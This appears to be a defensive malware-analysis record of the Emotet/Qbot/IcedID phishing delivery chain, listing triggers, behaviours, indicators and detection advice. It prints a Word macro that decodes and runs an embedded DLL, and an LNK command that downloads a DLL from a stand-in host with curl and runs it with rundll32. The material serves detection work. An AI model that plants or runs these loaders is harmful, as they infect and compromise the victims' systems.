package_info.package_manager: N/A (malware distributed via phishing attachments, not a package manager)
package_info.package_versions: N/A (malicious files: Excel, Word, ISO, LNK, CHM, DLL, JS, BAT, etc.)
package_info.why_malicious: The Emotet/Qbot/Icedid phishing delivery chain is malicious because it leverages phishing emails to deliver attachments or links that exploit user trust and system features. These attachments (Excel, Word, ISO, LNK, CHM, DLL, JS, BAT, etc.) use techniques such as macro-enabled documents, script execution, DLL hijacking, and obfuscated payloads to download, drop, and execute malware. The chain results in remote code execution, system compromise, credential theft, and enables further malware deployment, all without user awareness or consent.

execution_context.trigger: import-time (on file open, if macros enabled)
execution_context.file_location: Excel 4.0 Macro sheet (Sheet 7, cell F2 named 'Auto_Open')

malicious_snippets.code_behavior: At import-time, the macro uses the Auto_Open trigger to call Windows APIs, downloads a remote executable via URLDownloadToFileA, writes it to the local filesystem, and executes it using regsvr32.exe, resulting in remote code execution and initial malware infection.

malice_analysis.why_suspicious: The macro directly invokes Windows API functions to download and execute a file from the internet, a well-known malware delivery tactic.
malice_analysis.violated_expectations: Legitimate Excel macros should not perform network operations or execute system binaries; such behavior is outside normal document automation.
malice_analysis.similar_legitimate_use: Automated document processing in highly controlled, trusted enterprise environments (rare and auditable).
key_indicators: Auto_Open macro triggers on file open
Direct use of URLDownloadToFileA API in macro
Execution of regsvr32.exe from macro
Writes executable to public user directory

execution_context.trigger: import-time (on document open, if macros enabled)

malicious_snippets.code_snippet:
Sub Document_Open()
  Dim s As String
  s = GetTextFromXML('customXml/item1.xml')
  Dim b() As Byte
  b = HexStringToBytes(s)
  WriteBytesToFile('c:\ProgramData\xxx.dll', b)
  Shell 'rundll32.exe c:\ProgramData\xxx.dll,EntryPoint'
End Sub
malicious_snippets.code_behavior: At import-time, the macro executes on document open, extracts a hex-encoded DLL from embedded XML, decodes and writes it to disk, and launches it using rundll32.exe, resulting in execution of a malicious payload.

malice_analysis.why_suspicious: The macro writes a DLL to disk and executes it, which is a strong indicator of malware attempting to establish persistence or execute further payloads.
malice_analysis.violated_expectations: Legitimate Word macros should not extract, write, or execute DLLs; such actions are not part of normal document processing.
malice_analysis.similar_legitimate_use: Automated deployment scripts in trusted, internal environments (rare and typically with extensive logging and controls).
key_indicators: Extraction of binary data from custom XML
Writing DLL to ProgramData directory
Execution of DLL via rundll32.exe
Hex decoding of embedded payload

execution_context.trigger: user action (double-click LNK file in ISO)

malicious_snippets.code_snippet: LNK target: cmd.exe /c start image.png & curl.exe -o C:\Users\Public\malware.dll http://malicious-domain.com/payload.dll & rundll32.exe C:\Users\Public\malware.dll,EntryPoint
malicious_snippets.code_behavior: On user action, the LNK file is executed, which opens a decoy image, downloads a DLL from a remote server using curl.exe, writes it to disk, and immediately executes it with rundll32.exe, resulting in the execution of malicious code on the system.

malice_analysis.why_suspicious: The LNK file chains decoy file opening with network download and immediate execution of a DLL, a hallmark of phishing and malware delivery.
malice_analysis.violated_expectations: LNK files should not perform network downloads or execute DLLs; their normal use is to provide shortcuts to legitimate applications.
malice_analysis.similar_legitimate_use: Automated installers that download and run components, but only with explicit user consent and clear intent.
key_indicators: Chained commands in LNK target
Use of curl.exe to download DLL
Immediate execution of downloaded DLL via rundll32.exe
Presence of decoy file to distract user

execution_context.trigger: user action (double-click LNK file in ISO, triggers BAT and JS chain)
execution_context.file_location: LNK file -> BAT file (alsoThing.bat) -> JS file (weTo.js) inside ISO

malicious_snippets.code_behavior: On user action, the LNK file executes a BAT script, which launches a JS script that copies a disguised DLL (thenTake.txt) to a new location and executes it with rundll32.exe, resulting in obfuscated malware execution on the system.

malice_analysis.why_suspicious: The multi-stage script chain, use of a disguised DLL, and execution via rundll32.exe are designed to evade detection and facilitate malware execution.
malice_analysis.violated_expectations: Installer scripts should not obfuscate payloads or execute DLLs from files with misleading extensions; such behavior is not standard for legitimate installers.
malice_analysis.similar_legitimate_use: Complex installers in enterprise environments, but with transparency and user awareness.
key_indicators: Chained execution: LNK -> BAT -> JS
DLL payload disguised as .txt file
Copying disguised DLL to public directory
Execution of DLL via rundll32.exe

execution_context.trigger: user action (open CHM file in ISO)
execution_context.file_location: CHM file with appended script inside ISO

malicious_snippets.code_behavior: On user action, opening the CHM file executes an embedded JScript that launches rundll32.exe to execute a malicious DLL (app.dll), resulting in arbitrary code execution on the system.

malice_analysis.why_suspicious: CHM files with embedded scripts that execute DLLs are a known malware delivery vector, exploiting the trust in help files.
malice_analysis.violated_expectations: Help files should not execute arbitrary code or launch system binaries; their purpose is to provide documentation.
malice_analysis.similar_legitimate_use: Custom help systems with scripting, but not for DLL execution.
key_indicators: Script appended to CHM file
Use of ActiveXObject to launch rundll32.exe
Execution of DLL from help file context

execution_context.trigger: user action (double-click LNK file in ISO, triggers DLL hijacking)
execution_context.file_location: LNK file, calc.exe, WindowsCodecs.dll, 102755.dll inside ISO

malicious_snippets.code_behavior: On user action, the LNK file launches calc.exe, which due to DLL search order, loads a malicious WindowsCodecs.dll from the same directory. The malicious DLL's entry point (DLLMain) spawns regsvr32.exe to execute another malicious DLL (102755.dll), resulting in chained malware execution.

malice_analysis.why_suspicious: DLL search order hijacking with a system-named DLL and process spawning is a stealthy technique to execute malware under the guise of a legitimate process.
malice_analysis.violated_expectations: Legitimate DLLs should not spawn new processes or execute additional DLLs; such behavior is not expected in normal application operation.
malice_analysis.similar_legitimate_use: Testing or debugging environments, but not in production or user-facing software.
key_indicators: Malicious DLL named as system DLL (WindowsCodecs.dll)
DLL placed alongside legitimate executable (calc.exe)
DLL spawns regsvr32.exe to execute another DLL
Chained DLL execution for persistence or evasion

attack_chain.action: Phishing email delivers a malicious attachment (Excel, Word, ISO, or HTML Smuggling link).
User opens the malicious file, triggering code execution (macro, LNK, CHM, etc.).
attack_chain.leads_to: Malware payload is downloaded, dropped, or executed.

attack_chain.action: Malware payload is executed (via regsvr32.exe, rundll32.exe, or DLL hijacking).
attack_chain.leads_to: System compromise, data theft, or further malware deployment.

behavioral_signatures: Office macros that download and execute files using Windows API calls (e.g., URLDownloadToFileA, ShellExecuteA)
LNK files that chain decoy file opening with network download (curl.exe) and DLL execution (rundll32.exe)
Script chains (BAT/JS) that copy, rename, and execute disguised DLLs (e.g., .txt files containing DLL payloads)
CHM files with embedded JScript that launches rundll32.exe to execute DLLs
DLL search order hijacking with system-named DLLs (e.g., WindowsCodecs.dll) placed alongside legitimate executables and spawning new processes
file_indicators: Excel files containing Excel 4.0 macros (Auto_Open, CALL to URLDownloadToFileA or ShellExecuteA)
Word documents with VBA macros that extract and write DLLs from embedded XML
ISO files containing LNK, BAT, JS, CHM, DLL, or decoy files (e.g., image.png, thenTake.txt)
DLLs named as system libraries (e.g., WindowsCodecs.dll) present in non-system directories
Files with misleading extensions (e.g., .txt files containing DLL payloads, DLLs embedded in CHM files)
network_indicators: curl.exe or similar utilities downloading payloads from suspicious or non-corporate domains
Office macros or scripts making outbound HTTP/HTTPS requests to domains not associated with business operations (e.g., http://malicious-domain.com/payload.exe)
detection_knowledge.how_to_detect: Monitor for Office documents with macros that invoke Windows API calls for network downloads or executable writes. Flag LNK files in disk images that execute chained commands, especially those invoking curl.exe, rundll32.exe, or regsvr32.exe. Detect script chains (BAT/JS) that manipulate and execute DLLs, and CHM files with embedded scripts that launch system binaries. Watch for DLL search order hijacking by identifying non-system DLLs with system names loaded by legitimate executables. Correlate these file and behavioral indicators with network activity to suspicious domains or IPs, and alert on files with misleading extensions or unexpected file types in disk images. Implement automated scanning for these patterns to enable rapid detection and response.
